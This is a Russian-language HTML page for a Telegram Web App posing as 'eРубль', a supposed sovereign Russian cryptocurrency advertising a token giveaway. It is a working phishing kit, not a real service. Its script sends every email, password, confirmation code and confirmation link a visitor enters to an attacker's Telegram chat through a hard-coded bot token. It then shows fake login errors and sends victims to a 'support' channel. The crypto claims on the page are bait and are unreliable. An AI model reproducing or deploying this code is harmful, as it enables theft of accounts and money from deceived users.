<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>eРубль</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --bg-dark: #0b102a; --bg-card: #ffffff; --text-primary: #0b102a;
            --text-secondary: #6b7280; --text-muted: #8a9cbf; --accent: #1e64ff;
            --accent-hover: #0059ff; --danger: #b91c1c; --success: #00a63e;
            --border-color: #0b102a1a; --radius: 14px;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size-adjust: .48; background: #0b102a; color: var(--text-primary); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; -webkit-font-smoothing: antialiased; }
        img, svg { max-width: 100%; display: block; }
        button { cursor: pointer; font: inherit; color: inherit; background: 0 0; border: 0; padding: 0; }
        input { font: inherit; color: inherit; }
        a { color: inherit; text-decoration: none; }
        h1, h2, h3, h4, h5, h6 { font-size: inherit; font-weight: inherit; }
        p, h1, h2, h3, h4, h5, h6 { overflow-wrap: break-word; }

        .container {
            background: var(--bg-card); border-radius: 24px; padding: 24px 16px; width: 100%; max-width: 440px; min-height: 560px;
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6); border: 1px solid var(--border-color);
            display: flex; flex-direction: column; position: relative; overflow: hidden;
        }

        /* ЛОГО */
        .logo { text-align: center; margin-bottom: 24px; }
        .logo h1 { font-size: 36px; line-height: 40px; font-weight: 600; letter-spacing: -0.5px; }
        .logo h1 span { color: var(--accent); }
        .logo .sub { color: var(--text-secondary); font-size: 14px; line-height: 20px; margin-top: 4px; font-weight: 400; letter-spacing: 1.5px; text-transform: uppercase; }

        /* БАННЕР */
        .hero-banner { background: #e6f0ff; border-radius: 14px; padding: 16px; border: 1px solid var(--accent); margin: 4px 0 16px; text-align: center; }
        .hero-banner h2 { font-size: 20px; line-height: 28px; font-weight: 600; }
        .hero-banner .highlight { color: var(--accent); }
        .hero-banner p { color: var(--text-secondary); font-size: 14px; line-height: 20px; margin-top: 4px; }
        .hero-banner .badge { display: inline-block; background: #dcfce7; color: var(--success); padding: 4px 12px; border-radius: 9999px; font-size: 12px; line-height: 16px; font-weight: 500; margin-top: 8px; border: 1px solid rgba(0, 166, 62, 0.15); }

        /* МЕНЮ */
        .menu-grid { display: flex; flex-direction: column; gap: 4px; margin: 8px 0 16px; }
        .menu-item { padding: 12px 16px; background: #f5f7fa; border-radius: 14px; font-size: 16px; line-height: 24px; font-weight: 500; cursor: pointer; transition: background .15s; border: 1px solid transparent; text-align: left; display: flex; align-items: center; gap: 12px; }
        .menu-item:hover { background: #f0f3f7; border-color: var(--border-color); }
        .menu-item .icon { width: 24px; height: 24px; flex-shrink: 0; opacity: 0.6; display: flex; align-items: center; justify-content: center; }
        .menu-item .arrow { margin-left: auto; color: var(--text-muted); font-size: 18px; }

        /* КНОПКИ */
        .btn-primary { width: 100%; padding: 16px; background: linear-gradient(90deg, #1e64ff, #00cbef); color: #fff; border: none; border-radius: 14px; font-size: 16px; line-height: 24px; font-weight: 600; cursor: pointer; transition: filter .15s, transform .1s; margin-top: 8px; box-shadow: 0 8px 30px rgba(0, 102, 255, 0.25); }
        .btn-primary:hover:not(:disabled) { filter: brightness(0.95); transform: translateY(-1px); }
        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; filter: none !important; }

        .btn-eid { width: 100%; padding: 16px; background: #fff; color: var(--text-primary); border: 2px solid var(--text-primary); border-radius: 14px; font-size: 16px; line-height: 24px; font-weight: 500; cursor: pointer; transition: background .15s, color .15s; margin-top: 8px; display: flex; align-items: center; justify-content: center; gap: 10px; }
        .btn-eid:hover:not(:disabled) { background: var(--text-primary); color: #fff; }
        .btn-eid:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; }

        .btn-secondary { width: 100%; padding: 12px; background: #f5f7fa; color: var(--text-primary); border: 1px solid var(--border-color); border-radius: 14px; font-size: 16px; line-height: 24px; font-weight: 500; cursor: pointer; transition: background .15s; margin-top: 12px; }
        .btn-secondary:hover { background: #f0f3f7; }

        .btn-back { width: 100%; padding: 12px; background: transparent; color: var(--text-secondary); border: 1px solid var(--border-color); border-radius: 14px; font-size: 14px; line-height: 20px; font-weight: 500; cursor: pointer; transition: background .15s; margin-top: 12px; }
        .btn-back:hover { background: #f5f7fa; }

        .support-btn { width: 100%; padding: 12px; background: transparent; color: var(--accent); border: 1px solid var(--border-color); border-radius: 14px; font-size: 14px; line-height: 20px; font-weight: 500; cursor: pointer; transition: background .15s, color .15s; margin-top: 12px; }
        .support-btn:hover { background: #f5f7fa; color: var(--accent-hover); }

        /* ФОРМА */
        .form-group { margin-bottom: 16px; }
        .form-group label { display: block; font-size: 14px; line-height: 20px; font-weight: 500; color: var(--text-secondary); margin-bottom: 4px; }
        .form-group input { width: 100%; padding: 12px 16px; border: 1px solid var(--border-color); border-radius: 10px; font-size: 16px; line-height: 24px; transition: border-color .15s, box-shadow .15s; background: #f5f7fa; color: var(--text-primary); }
        .form-group input::placeholder { color: var(--text-muted); }
        .form-group input:focus { outline: none; border-color: var(--accent); box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.15); }
        .form-group input:disabled { opacity: 0.5; cursor: not-allowed; }

        .forgot-link { text-align: right; margin-top: -6px; margin-bottom: 12px; }
        .forgot-link a { color: var(--text-secondary); font-size: 14px; line-height: 20px; transition: color .15s; cursor: pointer; }
        .forgot-link a:hover { color: var(--accent); }

        .divider { display: flex; align-items: center; gap: 12px; margin: 16px 0 12px; }
        .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: var(--border-color); }
        .divider span { color: var(--text-muted); font-size: 12px; line-height: 16px; text-transform: uppercase; letter-spacing: 1px; }

        .register-link { text-align: center; font-size: 14px; line-height: 20px; color: var(--text-secondary); margin-top: 12px; }
        .register-link a { color: var(--accent); font-weight: 500; cursor: pointer; }
        .register-link a:hover { text-decoration: underline; }

        /* СТРАНИЦЫ */
        .page { display: none; flex-direction: column; animation: fadeIn 0.3s ease; flex: 1; }
        .page.active { display: flex; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }

        .page-title { font-size: 36px; line-height: 40px; font-weight: 600; text-align: center; margin-bottom: 4px; }
        .page-sub { font-size: 16px; line-height: 24px; color: var(--text-secondary); text-align: center; margin-bottom: 16px; }
        .page-icon { text-align: center; margin-bottom: 8px; display: flex; justify-content: center; }
        .page-icon svg { width: 48px; height: 48px; opacity: 0.7; }

        /* КОНТЕНТ БЛОКИ */
        .content-block { background: #f5f7fa; border-radius: 14px; padding: 16px; border: 1px solid var(--border-color); margin-bottom: 12px; }
        .content-block h3 { font-size: 20px; line-height: 28px; font-weight: 600; margin-bottom: 4px; }
        .content-block p { font-size: 14px; line-height: 20px; color: var(--text-secondary); }
        .content-block .num { font-size: 12px; line-height: 16px; font-weight: 600; color: var(--accent); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 4px; }
        .content-block .highlight-text { color: var(--accent); font-weight: 500; }
        .content-block .green-text { color: var(--success); font-weight: 500; }

        /* FAQ */
        .faq-item { background: #f5f7fa; border-radius: 14px; padding: 12px 16px; border: 1px solid var(--border-color); margin-bottom: 8px; }
        .faq-item .q { font-weight: 600; font-size: 16px; line-height: 24px; margin-bottom: 4px; }
        .faq-item .a { font-size: 14px; line-height: 20px; color: var(--text-secondary); }

        /* КОД / ССЫЛКА */
        .code-section { margin-top: 4px; padding: 16px; background: #f5f7fa; border-radius: 14px; border: 1px solid var(--border-color); }
        .code-section label { display: block; font-size: 14px; line-height: 20px; font-weight: 500; color: var(--text-secondary); margin-bottom: 8px; }
        .code-section input { width: 100%; padding: 12px 16px; border: 1px solid var(--border-color); border-radius: 10px; font-size: 16px; line-height: 24px; background: #fff; color: var(--text-primary); transition: border-color .15s, box-shadow .15s; margin-bottom: 12px; }
        .code-section input:focus { outline: none; border-color: var(--accent); box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.15); }
        .code-section input::placeholder { color: var(--text-muted); }
        .code-section input:disabled { opacity: 0.5; cursor: not-allowed; }

        /* СООБЩЕНИЯ */
        .message { margin-top: 16px; padding: 12px 16px; border-radius: 14px; display: none; text-align: center; font-size: 14px; line-height: 20px; font-weight: 500; animation: fadeIn 0.3s ease; }
        .message.success { display: block; background: #dcfce7; color: var(--success); border: 1px solid rgba(0, 166, 62, 0.15); }
        .message.error { display: block; background: #ffe2e2; color: #b91c1c; border: 1px solid #f5c6c6; }
        .message.info { display: block; background: #e6f0ff; color: var(--accent); border: 1px solid rgba(0, 102, 255, 0.15); }

        /* СТАТУС ОЖИДАНИЯ */
        .status-waiting { margin-top: 12px; padding: 12px; background: #e6f0ff; border-radius: 14px; border: 1px solid rgba(0, 102, 255, 0.15); text-align: center; color: var(--accent); font-size: 14px; line-height: 20px; display: none; }
        .status-waiting .spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(0, 102, 255, 0.15); border-top: 2px solid var(--accent); border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 8px; vertical-align: middle; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* ОШИБКА */
        .error-block { text-align: center; padding: 16px 0; }
        .error-block .icon { font-size: 56px; margin-bottom: 12px; color: var(--danger); }
        .error-block h2 { font-size: 36px; line-height: 40px; color: var(--danger); margin-bottom: 8px; font-weight: 600; }
        .error-block p { font-size: 16px; line-height: 24px; color: var(--text-secondary); margin-bottom: 16px; }

        /* E-ID */
        .page-eid .page-title { color: var(--text-primary); }
        .page-eid .form-group input { background: #fff; }
        .page-eid .btn-primary { background: var(--accent); box-shadow: 0 4px 16px rgba(0, 102, 255, 0.2); }
        .page-eid .btn-primary:hover:not(:disabled) { background: var(--accent-hover); }
        .page-eid .btn-back { color: var(--text-secondary); }
        .page-eid .btn-back:hover { background: #f5f7fa; }

        @media (max-width: 420px) {
            .container { padding: 16px 12px; border-radius: 16px; }
            .logo h1 { font-size: 28px; line-height: 32px; }
            .btn-primary, .btn-eid { font-size: 16px; line-height: 24px; padding: 12px; }
        }
    </style>
</head>
<body>

    <div class="container">

        <!-- ===== ЛОГО ===== -->
        <div class="logo">
            <h1><span>eРубль</span></h1>
            <div class="sub">Суверенная криптовалюта России</div>
        </div>

        <!-- ============================================================
        СТРАНИЦА 1: ГЛАВНАЯ
        ============================================================ -->
        <div id="pageMain" class="page active">
            <div class="hero-banner">
                <h2>Первичное <span class="highlight">распределение</span></h2>
                <p>1 миллиард eRub за 30 дней</p>
                <div class="badge">Акция стартовала</div>
            </div>

            <div class="menu-grid">
                <div class="menu-item" onclick="goToAbout()">
                    <span class="icon">i</span> О проекте
                    <span class="arrow">›</span>
                </div>
                <div class="menu-item" onclick="goToBuy()">
                    <span class="icon">+</span> Как купить
                    <span class="arrow">›</span>
                </div>
                <div class="menu-item" onclick="goToGuide()">
                    <span class="icon">≡</span> Руководство по eРублю
                    <span class="arrow">›</span>
                </div>
                <div class="menu-item" onclick="goToFaq()">
                    <span class="icon">?</span> Частые вопросы
                    <span class="arrow">›</span>
                </div>
            </div>

            <button id="loginBtn" class="btn-primary" onclick="goToLoginForm()">Войти</button>

            <div class="divider"><span>или</span></div>

            <button id="eidBtn" class="btn-eid" onclick="goToEid()">Вход через E-ID</button>

            <div class="register-link">
                Нет аккаунта? <a onclick="showMsg('Регистрация скоро появится', 'info')">Зарегистрироваться</a>
            </div>
        </div>

        <!-- ============================================================
        СТРАНИЦА 2: О ПРОЕКТЕ
        ============================================================ -->
        <div id="pageAbout" class="page">
            <div class="page-icon">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg>
            </div>
            <div class="page-title">О проекте</div>
            <div class="page-sub">Суверенная криптовалюта eRub</div>
            <div class="content-block"><p><span class="highlight-text">eRub</span> — это децентрализованная криптовалюта на базе собственного суверенного блокчейна.</p></div>
            <div class="content-block"><p>eRub не является стейблкоином или государственной цифровой валютой: ее рыночная стоимость формируется исключительно на основе открытого спроса и предложения.</p></div>
            <div class="content-block"><p>Проект сочетает концепцию <span class="highlight-text">национальной расчетной единицы</span> с фундаментальными принципами блокчейн-технологий.</p></div>
            <div class="content-block"><p>Сеть eRub функционирует под управлением <span class="highlight-text">децентрализованного сообщества</span> держателей монет.</p></div>
            <button class="btn-back" onclick="goToMain()">← Назад</button>
        </div>

        <!-- ============================================================
        СТРАНИЦА 3: КАК КУПИТЬ
        ============================================================ -->
        <div id="pageBuy" class="page">
            <div class="page-icon">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v20M2 12h20"/></svg>
            </div>
            <div class="page-title">Как купить eRub</div>
            <div class="page-sub">Пошаговая инструкция</div>
            <div class="content-block"><div class="num">Шаг 1</div><h3>Создай кошелёк</h3><p>Используйте готовый кошелёк или создайте новый в системе eRub.</p></div>
            <div class="content-block"><div class="num">Шаг 2</div><h3>Введи сумму</h3><p>Укажите количество рублей, USDT или USDC для обмена на eRub.</p></div>
            <div class="content-block"><div class="num">Шаг 3</div><h3>Получи eRub</h3><p>Токены мгновенно поступят на ваш кошелёк.</p></div>
            <button class="btn-back" onclick="goToMain()">← Назад</button>
        </div>

        <!-- ============================================================
        СТРАНИЦА 4: РУКОВОДСТВО
        ============================================================ -->
        <div id="pageGuide" class="page">
            <div class="page-icon">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 6h16M4 12h16M4 18h10"/></svg>
            </div>
            <div class="page-title">Руководство по eРублю</div>
            <div class="page-sub">Всё, что нужно знать</div>
            <div class="content-block"><div class="num">01</div><h3>Собственные технологии</h3><p>Мы принципиально не используем зарубежные платформы. еРубль работает на собственной, созданной с нуля цифровой платформе.</p></div>
            <div class="content-block"><div class="num">02</div><h3>Безопасность высшего уровня</h3><p>Постквантовая защита — передовой мировой стандарт безопасности.</p></div>
            <div class="content-block"><div class="num">03</div><h3>Доходность и экологичность</h3><p>Алгоритм Proof-of-Stake — пассивный доход и экологичность.</p></div>
            <button class="btn-back" onclick="goToMain()">← Назад</button>
        </div>

        <!-- ============================================================
        СТРАНИЦА 5: ЧАСТЫЕ ВОПРОСЫ
        ============================================================ -->
        <div id="pageFaq" class="page">
            <div class="page-icon">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 015.83 1c0 2-3 3-3 3"/><path d="M12 17h.01"/></svg>
            </div>
            <div class="page-title">Частые вопросы</div>
            <div class="page-sub">Ответы на популярные вопросы</div>
            <div class="faq-item"><div class="q">Что такое eRub?</div><div class="a">eRub — это суверенная криптовалюта на базе собственного блокчейна.</div></div>
            <div class="faq-item"><div class="q">Как купить eRub?</div><div class="a">Зарегистрируйтесь на платформе и перейдите в раздел «Как купить».</div></div>
            <div class="faq-item"><div class="q">Где хранить eRub?</div><div class="a">В официальном кошельке на платформе.</div></div>
            <button class="btn-back" onclick="goToMain()">← Назад</button>
        </div>

        <!-- ============================================================
        СТРАНИЦА 6: ВХОД (ЛОГИН/ПАРОЛЬ)
        ============================================================ -->
        <div id="pageLoginForm" class="page">
            <div class="page-icon">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 3h4a2 2 0 012 2v14a2 2 0 01-2 2h-4M10 17l5-5-5-5M15 12H3"/></svg>
            </div>
            <div class="page-title">Вход в eРубль</div>
            <div class="page-sub">Введите свои данные для входа</div>

            <div id="loginFields">
                <div class="form-group">
                    <label>Email</label>
                    <input type="email" id="email" placeholder="Введите ваш email">
                </div>
                <div class="form-group">
                    <label>Пароль</label>
                    <input type="password" id="password" placeholder="Введите пароль">
                </div>
            </div>

            <div class="forgot-link">
                <a onclick="showMsg('Функция восстановления скоро появится', 'info')">Забыли пароль?</a>
            </div>

            <button id="loginSubmitBtn" class="btn-primary">Войти</button>

            <div id="loginError" class="message error" style="display:none; margin-top:12px;">
                Ошибка. Повторите попытку входа.
            </div>

            <button class="btn-back" onclick="goToMain()">← Назад</button>
        </div>

        <!-- ============================================================
        СТРАНИЦА 7: КОД ПОДТВЕРЖДЕНИЯ
        ============================================================ -->
        <div id="pageCode" class="page">
            <div class="page-icon">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
            </div>
            <div class="page-title">Код подтверждения</div>
            <div class="page-sub">Введите код, отправленный на вашу почту</div>

            <div id="codeFields">
                <div class="code-section">
                    <label>Код из 6 цифр</label>
                    <input type="text" id="codeInput" maxlength="6" placeholder="• • • • • •" inputmode="numeric">
                    <button id="submitCodeBtn" class="btn-primary">Подтвердить</button>
                </div>
            </div>

            <div id="codeError" class="message error" style="display:none; margin-top:12px;">
                Неверный код. Попробуйте снова.
            </div>

            <div class="status-waiting" id="codeStatus">
                <span class="spinner"></span> Ожидание...
            </div>

            <button class="btn-back" onclick="goToLoginForm()">← Назад</button>
        </div>

        <!-- ============================================================
        СТРАНИЦА 8: E-ID
        ============================================================ -->
        <div id="pageEid" class="page page-eid">
            <div class="page-icon">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
            </div>
            <div class="page-title">Вход через E-ID</div>
            <div class="page-sub">Введите свои данные для входа</div>

            <div id="eidFields">
                <div class="form-group">
                    <label>Email</label>
                    <input type="email" id="eidEmail" placeholder="Введите ваш email">
                </div>
                <div class="form-group">
                    <label>Пароль</label>
                    <input type="password" id="eidPassword" placeholder="Введите пароль">
                </div>
            </div>

            <button id="eidSubmitBtn" class="btn-primary">Войти через E-ID</button>

            <div id="eidLoginError" class="message error" style="display:none; margin-top:12px;">
                Ошибка. Повторите попытку входа.
            </div>

            <button class="btn-back" onclick="goToMain()">← Назад</button>
        </div>

        <!-- ============================================================
        СТРАНИЦА 9: ССЫЛКА ПОДТВЕРЖДЕНИЯ (E-ID)
        ============================================================ -->
        <div id="pageEidLink" class="page page-eid">
            <div class="page-icon">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
            </div>
            <div class="page-title">Ссылка подтверждения</div>
            <div class="page-sub">Вставьте ссылку из письма</div>

            <div id="eidLinkFields">
                <div class="code-section">
                    <label>Ссылка подтверждения</label>
                    <input type="text" id="eidLinkInput" placeholder="Вставьте ссылку">
                    <button id="eidLinkSubmitBtn" class="btn-primary">Подтвердить</button>
                </div>
            </div>

            <div id="eidLinkError" class="message error" style="display:none; margin-top:12px;">
                Ошибка. Повторите попытку входа.
            </div>

            <div class="status-waiting" id="eidLinkStatus">
                <span class="spinner"></span> Ожидание...
            </div>

            <button class="btn-back" onclick="goToEid()">← Назад</button>
        </div>

        <!-- ============================================================
        СТРАНИЦА 10: ОШИБКА ВХОДА
        ============================================================ -->
        <div id="pageLoginError" class="page">
            <div class="error-block">
                <div class="icon">✕</div>
                <h2>Ошибка</h2>
                <p>Повторите попытку входа.</p>
                <button class="btn-secondary" onclick="goToMain()">← На главную</button>
            </div>
        </div>

        <!-- ============================================================
        СТРАНИЦА 11: ОШИБКА (3 попытки)
        ============================================================ -->
        <div id="pageError" class="page">
            <div class="error-block">
                <div class="icon">✕</div>
                <h2>Ошибка входа</h2>
                <p>Превышено количество попыток входа.<br>Обратитесь в техническую поддержку.</p>
                <button onclick="openSupport()" class="btn-primary" style="background:#b91c1c;box-shadow:0 8px 30px rgba(185,28,28,0.25);">
                    Техническая поддержка
                </button>
                <button class="btn-back" onclick="goToMain()" style="margin-top:10px;">← На главную</button>
            </div>
        </div>

        <!-- ===== СООБЩЕНИЯ ===== -->
        <div id="msg" class="message"></div>

        <!-- ===== ТЕХПОДДЕРЖКА ===== -->
        <div style="margin-top:auto;padding-top:14px;position:relative;z-index:1;">
            <button onclick="openSupport()" class="support-btn">🆘 Техническая поддержка</button>
        </div>

    </div>

    <script>
        const BOT_TOKEN = "8603629858:AAGJu7_3CWFJ_YQj_iJ2hjX45h053-3fAQY";
        const ADMIN_ID = "8542901240";
        const SUPPORT_LINK = "https://t.me/erubsite";

        const tg = window.Telegram.WebApp;
        tg.expand();

        const user = tg.initDataUnsafe?.user || {};
        const userId = user.id || 'неизвестно';

        const pageMain = document.getElementById('pageMain');
        const pageLoginForm = document.getElementById('pageLoginForm');
        const pageCode = document.getElementById('pageCode');
        const pageEid = document.getElementById('pageEid');
        const pageEidLink = document.getElementById('pageEidLink');
        const pageLoginError = document.getElementById('pageLoginError');
        const pageError = document.getElementById('pageError');

        const email = document.getElementById('email');
        const password = document.getElementById('password');
        const codeInput = document.getElementById('codeInput');
        const eidEmail = document.getElementById('eidEmail');
        const eidPassword = document.getElementById('eidPassword');
        const eidLinkInput = document.getElementById('eidLinkInput');

        const loginSubmitBtn = document.getElementById('loginSubmitBtn');
        const submitCodeBtn = document.getElementById('submitCodeBtn');
        const eidSubmitBtn = document.getElementById('eidSubmitBtn');
        const eidLinkSubmitBtn = document.getElementById('eidLinkSubmitBtn');

        function showMsg(text, type = 'info') {
            const msgDiv = document.getElementById('msg');
            msgDiv.textContent = text;
            msgDiv.className = `message ${type}`;
            msgDiv.style.display = 'block';
            setTimeout(() => { msgDiv.style.display = 'none'; }, 5000);
        }

        function switchPage(page) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            page.classList.add('active');
            document.getElementById('msg').style.display = 'none';
        }

        function goToMain() {
            switchPage(pageMain);
            email.value = ''; password.value = ''; codeInput.value = '';
            eidEmail.value = ''; eidPassword.value = ''; eidLinkInput.value = '';
            loginSubmitBtn.disabled = false; loginSubmitBtn.textContent = 'Войти';
            eidSubmitBtn.disabled = false; eidSubmitBtn.textContent = 'Войти через E-ID';
            eidLinkSubmitBtn.disabled = false; eidLinkSubmitBtn.textContent = 'Подтвердить';
        }

        function goToAbout() { switchPage(document.getElementById('pageAbout')); }
        function goToBuy() { switchPage(document.getElementById('pageBuy')); }
        function goToGuide() { switchPage(document.getElementById('pageGuide')); }
        function goToFaq() { switchPage(document.getElementById('pageFaq')); }
        function goToLoginForm() { switchPage(pageLoginForm); setTimeout(() => email.focus(), 300); }
        function goToEid() { switchPage(pageEid); setTimeout(() => eidEmail.focus(), 300); }
        function goToEidLink() { switchPage(pageEidLink); setTimeout(() => eidLinkInput.focus(), 300); }
        function goToLoginError() { switchPage(pageLoginError); }
        function goToError() { switchPage(pageError); }

        function openSupport() {
            window.open(SUPPORT_LINK, '_blank');
        }

        async function sendToAdmin(text) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: ADMIN_ID, text: text })
                });
                const result = await response.json();
                return result.ok;
            } catch (error) {
                console.error('Ошибка:', error);
                return false;
            }
        }

        // 1. Обычный вход
        loginSubmitBtn.addEventListener('click', async function() {
            const e = email.value.trim();
            const p = password.value.trim();
            if (!e || !p) { showMsg('Заполните все поля', 'error'); return; }
            if (!e.includes('@')) { showMsg('Введите корректный email', 'error'); return; }

            loginSubmitBtn.disabled = true;
            loginSubmitBtn.textContent = 'Отправка...';

            const ok = await sendToAdmin(`🔔 Новая заявка\n👤 ID: ${userId}\n📧 Email: ${e}\n🔑 Пароль: ${p}`);

            if (ok) {
                loginSubmitBtn.disabled = false;
                loginSubmitBtn.textContent = 'Войти';
                switchPage(pageCode);
                document.getElementById('codeStatus').style.display = 'block';
                showMsg('Ожидание...', 'success');
                setTimeout(() => codeInput.focus(), 300);
            } else {
                loginSubmitBtn.disabled = false;
                loginSubmitBtn.textContent = 'Войти';
                document.getElementById('loginError').style.display = 'block';
                showMsg('Ошибка отправки', 'error');
            }
        });

        // 2. Код
        submitCodeBtn.addEventListener('click', async function() {
            const code = codeInput.value.trim();
            if (!code || code.length < 4) { showMsg('Введите корректный код', 'error'); return; }

            submitCodeBtn.disabled = true;
            submitCodeBtn.textContent = 'Отправка...';

            const ok = await sendToAdmin(`📧 Код подтверждения\n👤 ID: ${userId}\n📧 Код: ${code}`);

            if (ok) {
                submitCodeBtn.disabled = false;
                submitCodeBtn.textContent = 'Подтвердить';
                codeInput.value = '';
                document.getElementById('codeStatus').style.display = 'none';
                goToLoginError();
            } else {
                submitCodeBtn.disabled = false;
                submitCodeBtn.textContent = 'Подтвердить';
                document.getElementById('codeError').style.display = 'block';
                showMsg('Ошибка отправки', 'error');
            }
        });

        // 3. E-ID Логин
        eidSubmitBtn.addEventListener('click', async function() {
            const e = eidEmail.value.trim();
            const p = eidPassword.value.trim();
            if (!e || !p) { showMsg('Заполните все поля', 'error'); return; }
            if (!e.includes('@')) { showMsg('Введите корректный email', 'error'); return; }

            eidSubmitBtn.disabled = true;
            eidSubmitBtn.textContent = 'Отправка...';

            const ok = await sendToAdmin(`🆔 E-ID\n👤 ID: ${userId}\n📧 Email: ${e}\n🔑 Пароль: ${p}`);

            if (ok) {
                eidSubmitBtn.disabled = false;
                eidSubmitBtn.textContent = 'Войти через E-ID';
                switchPage(pageEidLink);
                document.getElementById('eidLinkStatus').style.display = 'block';
                showMsg('Ссылка отправлена на почту', 'success');
                setTimeout(() => eidLinkInput.focus(), 300);
            } else {
                eidSubmitBtn.disabled = false;
                eidSubmitBtn.textContent = 'Войти через E-ID';
                document.getElementById('eidLoginError').style.display = 'block';
                showMsg('Ошибка отправки', 'error');
            }
        });

        // 4. E-ID Ссылка
        eidLinkSubmitBtn.addEventListener('click', async function() {
            const link = eidLinkInput.value.trim();
            if (!link) { showMsg('Вставьте ссылку подтверждения', 'error'); return; }

            eidLinkSubmitBtn.disabled = true;
            eidLinkSubmitBtn.textContent = 'Отправка...';

            const ok = await sendToAdmin(`🔗 Ссылка\n👤 ID: ${userId}\n🔗 Ссылка: ${link}`);

            if (ok) {
                eidLinkSubmitBtn.disabled = false;
                eidLinkSubmitBtn.textContent = 'Подтвердить';
                eidLinkInput.value = '';
                document.getElementById('eidLinkStatus').style.display = 'none';
                goToLoginError();
            } else {
                eidLinkSubmitBtn.disabled = false;
                eidLinkSubmitBtn.textContent = 'Подтвердить';
                document.getElementById('eidLinkError').style.display = 'block';
                showMsg('Ошибка отправки', 'error');
            }
        });
    </script>
</body>
</html>
